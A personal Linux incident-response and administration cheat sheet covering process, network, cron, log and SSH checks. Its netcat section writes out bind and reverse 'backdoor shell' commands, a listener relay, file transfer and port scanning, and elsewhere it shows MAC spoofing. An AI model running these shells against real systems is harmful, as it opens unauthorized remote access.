# Unix/Ubuntu Bash Notes & Cheat Sheet 
Notes last updated: 4.10.2024


# NETWORK INTERFACE INFO   
``` 
ip addr show
```
```
ip route show
```
show all ip info 
```
ip a
``` 

Show ip info - requires net-utils is installed
 ```
ifconfig 
```

List network devices and grep for promiscuous mode, which may indicate a network sniffer 
```
 ip link | grep PROMISC
```


# NETSTAT COMMANDS
Show network connections, protocol, IPs, ports, connection state, PID, and process name creating the connection: 
```
netstat -apnvtu
```
Similar to above, but resolves the foreign addresses to domain names: 
```
sudo netstat -tup
```
Show numerical addresses (n), both listening and non-listening sockets (a), and include information related to networking timers. 
```
netstat -nao
```

add 'c' for continuos. 
```
netstat -apnvtuc
``` 

get a live list of processes & network connections. Remove 'c' to get a static list. 
```
netstat -A inet -pc
```


# RUNNING PROCESSES
show running process
```
 ps aux
```
tree the running processes 
```
pstree
```
tree the running processes for a user 
```
sudo pstree -pa root
```
save 3 iterations of the top command to a file 
```
top -n 3 -b > processes.txt
```


# List Open Files - (Handles) 
 Show list of open handles
```
lsof
```

list open files with network connections
```
lsof -i
```

List open files that are completely unlinked   
```
lsof +L1
```
Info: Look for processes running out of or accessing files that have been unlinked (ie. link count 0). An attacker may be hiding data in or running a backdoor from such a file 

Investigate a PID in-depth 
```
lsof –p [pid]
```
   
# KILL PROCESSES
Kill multi processes at once 
```
pgrep <processName> | xargs kill
```

Kill a process using its name. 
```
pkill -9 <gedit>
```

Kill multi processes at once by name
```
killall -9 <gedit>
```
 
kill a process by its pid 
```
 kill -9 <pid>
```
```
Example: kill -9 7154 7192 7210 7227 10248 10296 10386 10391 10405 10422
```

kill all processes by a user 
```
killall -u <username>
```
```
Example: killall -u user1
```

# SUDO Access per User 
Remove the user from the sudo group 
```
sudo deluser USERNAME sudo
```

Grant a user SUDO access    
```
sudo usermod -aG sudo $UserName
```


# LIST STARTUP ITEMS

```
ls -la /etc/init
```
```
ls -la /etc/init.conf
```
```
ls -la /etc/rc.d
```
```
ls -la /etc/init.d
```
```
cat /etc/inittab
```


# LIST CRON JOBS 
 ```
cat /etc/crontab
```
```
ls -la /etc/cron.monthly/
```
```
ls -la /etc/cron.weekly/
```
```
ls -la /etc/cron.daily/
```
```
ls -la /etc/cron.hourly/
```
   
Info: Look for cron jobs scheduled as root or any other UID 0 accoutns 
List root's cron jobs 
```
crontab –l
```
```
crontab –u {user} –l
```
Info: Look for unusual system wide cron jobs    
```
cat /etc/crontab
ls /etc/cron.*
```

# LIST INSTALLED APPS   
List apps installed via snap 
```
snap list
```

list installed apps via apt 
```
apt list --installed
```
```
grep " install " /var/log/apt/history.log
```
list installed apps via dpkg
```
grep " install " /var/log/dpkg.log
```
```
sudo dpkg --get-selections | grep -v deinstall
```
```
dpkg --get-selections 
grep install /var/log/dpkg.log /var/log/dpkg.log.1
```
```
ls -AlF /var/lib/dpkg/info/
ll /var/lib/dpkg/info/ | grep -i '.list'
```

# Searching Finding & Sorting
Search for patterns in each file: 
```
grep
```
Zgrep is able to grep through gzip archives:    
```
zgrep
```
Regex grep (similar to grep -E):  
```
egrep
```
```
Example: egrep -ir --include=*.{docx} "jacking"
         egrep -ir --include=*.{html} "jacking"
         egrep -ir --include=*.{html} "clickjacking"
```

use 'find' to find a file on a unix system. 
```
find
```
```
Example: find ./ -type f -name "*.cert"
         find . -type f -name ".html"
         find . -type f -name "*.html"
         find . -type f -name "*.html" | grep -i report
         find ./ -type f -name "*.opvn"
         find ./ -type f -name "opravpn*"
         find ./ -type f -name "*vpn*"
         find . -type f -name "*.kdbx"
         find ~/ -iname "*.txt" 
         find ~/ -iname "* sSn*" 
```

Info: Look for orphaned files, which could be a sign of an attacker's temp account that has been deleted 
```
find / -nouser -print
```
   
Info: Look for unusual SUID root files
```
find / -uid 0 -perm 4000 -print
```
    
Info: Look for unusually large files (gt 10MB)
```
find / -size +10000k –print
```
   
Info: Look for files with dots and spaces, used to camouflage files
```
find / -name ".. " –print
find / -name ". " –print
find / -name " " –print
find / -name “ “ –print
find / -regex '.+[^A-Za-z0-9(+=_-/.,!@#$%^&*~:;)]' -print
``` 
List Symbolic LInks in a dir 
```
find . -maxdepth 1 -type l -ls
```
Find duplicates
```
find . ! -empty -type f -exec md5sum {} + | sort | uniq -w32 -dD
```

# LIST MOUNTED FILES, DRIVES, Block Devices
List all mounted files and drives 
```
ls -lat /mnt
```

List all File Systems    
```
df -h | grep -v snap
```

list info about block devices 
```
lsblk
```
   
List the FileSystem Type of an img file. 'blkid' - will return the fs type or nothing if it's raw data   
```
sudo blkid -o value -s TYPE ./sda3.dd-ptcl-img
``` 
Dependant: sudo apt-get install vmfs-tools -- ESXi datastores use VMware’s proprietary VMFS filesystem.


# MOUNT/UNMOUNT IMGAGES, DRIVES, BLOCK DEVICES
```
sudo losetup -f -P ./img.dd
```
```
sudo losetup --detach /dev/loop2
```
https://askubuntu.com/questions/483009/mounting-disk-image-in-raw-format


# Archives and Zips
```
zip
```
```
Example: zip --encrypt zipArchive.zip ./file
         zip -er File.zip ./File
```
7zip extract archive
```
7z x <./archive.7z> 
```
7zip create an archive 
```
7z a <archive.7z> ./archive
```

# clamscan - ClamAV
```
clamscan ./file
```
```
clamscan -r -i /home
```
```
clamscan -r -i --bell ./
```
```
clamscan -r --remove /media/$USER/MalwareFolder/
```
```
clamscan -r --move=/home/$USER/MalwareFolder/
```
```
clamscan -r --copy=/media/$USER/MalwareFolder/ --file-list=./evolutionPathsFile.txt | tee ~/MalwareFolder/logFile.txt
```
   
Update ClamAV
```
freshclam
```

# UFW - FIREWALL
https://www.digitalocean.com/community/tutorials/how-to-setup-a-firewall-with-ufw-on-an-ubuntu-and-debian-cloud-server
```
sudo apt install ufw
sudo ufw status
sudo ufw enable
sudo ufw disable
```
IPV6 - https://itsfoss.com/disable-ipv6-ubuntu-linux/


# SSH & SSH Keypairs
The order of precedence for SSH config is as follows:
  1. Command-line arguments
  2. User config file (`~/.ssh/config`)
  3. System config file (`/etc/ssh/ssh_config`)

Resourses:
* Setup - https://www.ssh.com/ssh/public-key-authentication
* ciphers - https://infosec.mozilla.org/guidelines/openssh.html

 # Disable password logins on server (optional)
  ```
  sudo nano /etc/ssh/sshd_config
  ```
* Change to no to disable tunnelled clear text passwords
``` #PasswordAuthentication yes ```
* Uncomment the second line, and, if needed, change yes to no.
``` PasswordAuthentication no ```

# Generate an SSH Key (both pub/priv).	 
```
ssh-keygen -t ed25519 -f ~/.ssh/your-key-filename -C "your-key-comment"
```
```
ssh-keygen -f ./keyName_alg -t ecdsa -b 521
```

Add public key to user's authorized_keys file
```
ssh-copy-id -i ./keyName_alg.pub User@host 
```

Add a private key to the ssh-agent 
```
ssh-add ~/.ssh/path/to/privkey
```

.ssh permissions    
```
chmod 700 $HOME/.ssh 
chmod 644 ~/.ssh/authorized_keys
chmod 644 ~/.ssh/pulic_key.pub
chmod 600 ~/.ssh/private_key #If Keys need to be read-writable by you
chmod 400 ~/.ssh/private_key #Keys need to be only readable by you.
```

# POSIX ACLs & File Permissions
Give tom access to folder     
```
setfacl -m user:tom:rwx /home/samantha/folder
```
```
Permissions Guide: USER-GROUP-ALL 
Number	     Permission Type	      Symbol
0	      No Permission	         ===
1	      Execute	                 --x
2	      Write	                 -w-
3	      Execute + Write	         -wx
4	      Read	                 r--
5	      Read + Execute	         r-x
6	      Read +Write	         rw-
7	      Read + Write +Execute	 rwx

r = read permission
w = write permission
x = execute permission
- = no permission
```
LINK: https://www.guru99.com/file-permissions.html

# Lynis Audit - Security check 
```
sudo lynis audit system | tee ~/lynis_output_log.txt && sudo cp /var/log/lynis.log ~/lynis.log && sudo chown $USER:$USER ~/lynis.log
```

# System Checks
Check if IPv6 is enabled 
```
cat /sys/module/ipv6/parameters/disable
```

Check if IPv6 is enabled (prefered) 
```
sysctl -a 2>/dev/null | grep disable_ipv6
```

# Check Desktop UI
echo the current UI
```
echo $XDG_SESSION_TYPE  
```
Switch off Wayland and use X11 - most things work better. 
```
sudo nano /etc/gdm3/custom.conf
	uncomment "#WaylandEnable=false"
```


# GIT Commands

```
git clone
```
   
# GIT Packages
```
git clone https://github.com/sans-blue-team/DeepBlueCLI.git
git clone https://github.com/elceef/dnstwist.git
git clone https://github.com/decalage2/oletools.git
git clone https://github.com/sleuthkit/autopsy.git
git clone https://github.com/dafthack/DomainPasswordSpray.git
```        

# One Liners, Tips & Tricks
Info: Look in etc passwd for new accounts sorted by UID. UID less than 500 = SUSPECT. 
```
sort /etc/passwd -nk3 -t: | less
cat /etc/passwd | sort -nk3 -t:
```
   
Info: Find any unexpected UID 0 accounts (root)
```
getent passwd | egrep ':0+:'
egrep ':0+:' /etc/passwd
grep :0: /etc/passwd
```   

get cpu temps - sudo apt install lm-sensors -y && sudo sensors-detect 
```
sensors
```

Clone a website with Wget
```
wget --recursive --page-requisites --adjust-extension --span-hosts --convert-links --restrict-file-names=windows --user-agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0" --domains "https://some.website.com" --no-parent "https://some.website.com" --no-check-certificate --max-redirect 0
```


# not sure...  
```
nmcli device show <interFaceName> | grep IP4.DNS
```

   
Info: Look for excesive Memory use 
```
free
```
   

Info: List last login for each user 
```
lastlog
```
   
Info: user logins and system reboots. File may be truncated weekly or monthly
Look for rolled logs too (ll /var/log/ | grep -i wtmp).
```
last
last -f /var/log/wtmp
```
   
Info: Failed Logins. May not be kept due to risk of password disclosure. 
```
lastb 
lastb -f /var/log/btmp | less
```

Info: SSH auth failures are logged here /var/log/auth.log
Link: https://serverfault.com/questions/130482/how-to-check-sshd-log
```
grep 'sshd' /var/log/auth.log
tail -n 500 /var/log/auth.log | grep 'sshd'   (last 500 logs)
tail -f -n 500 /var/log/auth.log | grep 'sshd'   (live view)
```

Info: Find users that have been added to the system 
```
sudo ausearch -if /var/log/audit/audit.log -c useradd
```
   
Info: Split large CSV file into many with 999 rows, and keep the headers. 
```
cat bigFile.csv | parallel --header : --pipe -N999 'cat >split_file_{#}.csv'
```

Split large CSV file into many   
```
split -d -l 10000 file_name.csv file_part_
```
file_name = Name of the file you want to split.
10000 = Number of rows each split file would contain
file_part_ = Prefix of split file name (file_part_0,file_part_1,file_part_2..etc goes on)


#Display enviroment variables 
```
env
```

#Display alias
```
alias
```

#Check For Hardware Events
```
dmesg | grep hd
```

#DiskUsage
```
df -ahT
```

# Virtual Memory Statistics  
```
vmstat
```

#list last logged in users
```
lastlog
```

#list last logged in users
```
last
```

info: list last logged in users
```
w
```

# Show host file
```
cat /etc/hosts
```

# Imaging 
Write image to disk 
```
sudo dd if=./ubuntu-18.04.4-desktop-amd64.iso of=/dev/sdc
```

# Monitor network usage
```
iftop
```

# Check for updates
```
sudo apt update && sudo apt upgrade -y && sudo snap refresh
```
```
update-manager -d
```

# NetCat Commands
Fundamental Netcat Client:
```
$ nc [TargetIPaddr] [port]
```
Fundamental Netcat Listener:
```
$ nc –l -p [LocalPort]
```
Both the client and listener take input from STDIN
and send data received from the network to STDOUT

* File transfer using NetCat

Push a file from client to listener:
```
$ nc –l -p [LocalPort] > [outfile]
```
Listen on [LocalPort],  results in [outfile]
```
$ nc –w3 [TargetIPaddr] [port] <[infile]
```
Push [infile] to [TargetIPaddr] on [port]
Pull file from listener back to client:
```
$ nc –l -p [LocalPort] < [infile]
```
Listen on [LocalPort], prep to push [infile]
```
$ nc –w3 [TargetIPaddr] [port] > [outfile]
```
Connect to [TargetIPaddr] on [port] and retrieve [outfile]

* NetCat TCP Port Scanner

Port scan an IP Address:
```
$ nc –v –n –z –w1 [TargetIPaddr]
```
[start_port]-[end_port]
Attempt to connect to each port in a range from
[end_port] to [start_port] on IP Address
[TargetIPaddr] running verbosely (-v on Linux, -
vv on Windows), not resolving names (-n), without
sending any data (-z), and waiting no more than 1
second for a connection to occur (-w1)
The randomize ports (-r) switch can be used to
choose port numbers randomly in the range

* TCP Banner Grabber
Grab the banner of any TCP service running on an IP
Address from Linux:
```
$ echo "" | nc –v –n –w1 [TargetIPaddr]
```
[start_port]-[end_port]
Attempt to connect to each port in a range from
[end_port] to [start_port] on IP Address
[TargetIPaddr] running verbosely (-v), not
resolving names (-n), and waiting no more than 1
second for a connection to occur (-w1). Then send a
blank string to the open port and print out any
banner received in response
Add –r to randomize destination ports within the
range
Add –p [port] to specify a source port for the

* NetCat Backdoor Shells

Listening backdoor shell on Linux:
```
$ nc –l –p [LocalPort] –e /bin/bash
```
Listening backdoor shell on Windows:
```   
C:\> nc –l –p [LocalPort] –e cmd.exe
```

Create a shell on local port [LocalPort] that can then be accessed using a fundamental Netcat client
NetCt Reverse backdoor shell on Linux:
```
$ nc [YourIPaddr] [port] –e /bin/bash
```
Reverse backdoor shell on Windows:
```
C:\> nc [YourIPaddr] [port] –e cmd.exe
```
Create a reverse shell that will attempt to connect to
[YourIPaddr] on local port [port]. This shell
can then be captured using a fundamental nc listener

Netcat Relays on Linux
To start, create a FIFO (named pipe) called backpipe:
```
   $ cd /tmp
   $ mknod backpipe p
```
Listener-to-Client Relay:
```
   $ nc –l –p [LocalPort] 0<backpipe | nc [TargetIPaddr] [port] | tee backpipe
```
Create a relay that sends packets from the local port [LocalPort] to a Netcat client connected to [TargetIPaddr] on port [port]
Listener-to-Listener Relay:
```
   $ nc –l –p [LocalPort_1] 0<backpipe | nc –l –p [LocalPort_2] | tee backpipe
```
Create a relay that sends packets from anyconnection on [LocalPort_1] to any connection on [LocalPort_2]

Client-to-Client Relay:
```
   $ nc [PreviousHopIPaddr] [port] 0<backpipe | nc [NextHopIPaddr] [port2] | tee backpipe
```

Create a relay that sends packets from the connection to [PreviousHopIPaddr] on port [port] to a Netcat client connected to [NextHopIPaddr] on port [port2]


# TCP Dump 
   
# SNORT IDS

# BRO 

# Remnux - VMWare make share folder available (run on guest)
* https://askubuntu.com/questions/29284/how-do-i-mount-shared-folders-in-ubuntu-using-vmware-tools
```
   sudo vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other -o uid=1000
```



# Run Commands through a Jump host
-- DNS LOGS -- 
```
ssh pivotgw ssh {serverip} sudo zgrep query /var/log/dnsmasq.* > ~/Documents/DNS_queries.txt 
ssh pivotgw ssh 10.40.48.254 sudo zgrep query /var/log/dnsmasq.*  | cut -d ':' -f5 | cut -d ' ' -f3 | sort | uniq -c | sort -nr > ~/Documents/DNS_Logs_Stacked.txt
ssh pivotgw ssh 10.40.48.254 sudo zgrep query /var/log/dnsmasq.* | grep -i -E "chatvisor|screenconnect|teamview|anydesk|example.com" | sort > ~/Documents/DomainLookup_report.txt
```
-- NETWORK CONNECTIONS -- 
```
ssh pivotgw ssh {serverip} sudo lsof -i | grep ESTABLISHED > ~/Documents/lsof_i.log
ssh pivotgw ssh {serverip} sudo lsof -i -n -P
ssh pivotgw ssh {serverip} sudo netstat -apnvtu | grep -i estab
```	 
-- HOST FILE -- 
```
ssh pivotgw ssh {serverip} cat /etc/hosts
```
-- RUNNING PROCESSES -- 
```
ssh pivotgw ssh {serverip} sudo ps aux
```
-- BASH HISTORY FOR ALL USERS (not through Jump Host) -- 
```
sudo su
getent passwd | cut -d : -f 6 | sed 's:$:/.bash_history:' | xargs -d '\n' grep -s -H -e "$pattern"
```
-- LIST USERS -- 
```
ssh pivotgw ssh {serverip}  cat /etc/passwd | grep -v "nologin" | grep -v "false"| grep -v "sync"
ssh pivotgw ssh {serverip} w
```
-- MOST RECENT LOGINS -- 
```
ssh pivotgw ssh {serverip} last
```	
-- List init* & rc.d -- 
```
ssh pivotgw ssh {serverip} sudo ls -la /etc/inittab
init.d: ssh pivotgw ssh {serverip} sudo ls -la /etc/init.d
rc.d: ssh pivotgw ssh {serverip} sudo ls -la /etc/rc.d
init.conf: ssh pivotgw ssh {serverip} sudo ls -la /etc/init.conf
init: ssh pivotgw ssh {serverip} sudo ls -la /etc/init
```
-- AUTH LOGS -- 
```
ssh pivotgw ssh {serverip} sudo cat /var/log/auth.log
ssh pivotgw ssh {serverip} sudo cat /var/log/auth.log | grep -i Accepted | cut -d ':' -f4 | cut -d' ' -f5 | sort | uniq -c | sort -nr
ssh pivotgw ssh {serverip} sudo cat /var/log/auth.log | grep -i Accepted | cut -d ':' -f4 | cut -d' ' -f7 | sort | uniq -c | sort -nr
ssh pivotgw ssh {serverip} sudo cat /var/log/auth.log | grep -i Accepted | cut -d ':' -f4 | cut -d' ' -f5,7 | sort | uniq -c | sort -nr
ssh pivotgw ssh {serverip} sudo cat /var/log/auth.log | grep -E 'sshd.*Failed|Invalid|failure'
```
-- List the top 25 largest files on the server -- 
```
ssh pivotgw ssh {serverip} sudo find /home -printf '%s\\\ %p\\\\n'| sort -nr | head -25
```
-- rsync files from server to local host: 

* On the server:
```
sudo su
cp /file/location/filename /home/{yourUsername}/
cd /home/{yourUserName}
chown {yourUsername} {filename}
```
If dealing with multiple files or a directory, zip the contents of the directory first. Then rsync it to your system. 

* On Client (workstation) : 
```
rsync -v -r -e "ssh pivotgw ssh" {serverip}:/home/{yourUserName}/{FileName} ~/temp/IR
```
```
rsync -v -e "ssh pivotgw ssh" 10.16.33.254:/home/$USER/someArchive.zip ~/Documents/IR/
```

# Find hosts using mDNS 
```
avahi-browse -a
```

# Change MAC Address
1. Take the NIC down 
```
sudo ifconfig {eth0} down 
```
2. Assign new address 
```
sudo ifconfig {eth0} hw ether de:db:33:fc:of:f3 
```
3. Bring interface backup
```
sudo ifconfig {eth0} up
```

# Python webserver for file transfer 
python3
```
python3 -m http.server 8080
```

python2
```
python -m SimpleHTTPServer 80
```

# De-Crypt additional drive(s) on boot
Run commands as root: 
```
sudo su 
```
Start by making a keyfile with a password - use dd to generate a pseudorandom one:
```
dd if=/dev/urandom of=/root/.keyfile bs=1024 count=4
```
chmod 0400 keyfile 
```
chmod 0400 /root/.keyfile
```
Find the drive to decrypt on boot: 
```
lsblk
```
sda = The drive to decrypt: 
```
cryptsetup -v luksAddKey /dev/sda /root/.keyfile
```

Find the UUID of drive/partition with the following comamnd:
```
ls -l /dev/disk/by-uuid/
```

Then edit /etc/crypttab with editor:
```
nano /etc/crypttab
```

Add a line to the crypttab: 
```
sda3_crypt UUID=025c66a2-c683-42c5-b17c-322c2188fe3f none luks,discard
```
Format is Name UUID none luks,discard

Save the file and proceed with updating the initramfs:
```
update-initramfs -u
```
Then reboot. 
